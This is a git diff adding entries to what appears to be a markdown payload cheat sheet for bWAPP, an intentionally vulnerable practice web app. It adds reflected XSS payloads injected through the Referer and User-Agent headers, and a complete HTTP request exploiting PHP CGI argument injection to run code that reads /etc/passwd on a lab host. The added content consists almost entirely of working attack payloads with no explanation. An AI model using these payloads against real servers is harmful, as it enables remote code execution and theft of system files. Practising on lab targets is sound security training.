@@ -120,6 +120,29 @@ bWAPP: <script>alert(2017)</script>
 date=alert(2017)
 ```
 
+### XSS - Reflected (HREF)
+```
+Referer: <script>alert(2017)</script>
+```
+
+### XSS - Reflected (User-Agent)
+```
+User-Agent: <script>alert(2017)</script>
+```
+### PHP CGI Remote Code Execution
+```
+POST /bWAPP/admin/phpinfo.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
+Host: 192.168.200.150
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Length: 70
+Cookie: security_level=0; PHPSESSID=e27e4148fbb0b82028e1cd6e159f4e7a
+Connection: close
+
+<?php $r; exec('cat /etc/passwd', $r); echo implode($r, "\n"); die; ?>
+```
 
 
 
